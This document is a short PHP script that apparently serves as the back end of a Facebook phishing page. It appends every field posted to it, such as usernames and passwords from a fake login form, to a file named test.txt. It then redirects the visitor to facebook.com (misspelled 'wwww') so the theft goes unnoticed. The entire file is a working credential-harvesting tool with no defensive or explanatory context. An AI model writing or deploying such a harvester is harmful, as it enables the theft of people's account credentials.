<?php

header("location: http://wwww.facebook.com"); 
$handle = fopen("test.txt","a");

foreach($_POST as $variable => $value)
{
	fwrite($handle,$variable);
	fwrite($handle,"=");
	fwrite($handle,$value);
	fwrite($handle,"\r\n");

}
fwrite($handle, "----x------x------x-----x----");
fclose($handle);
exit;
?>
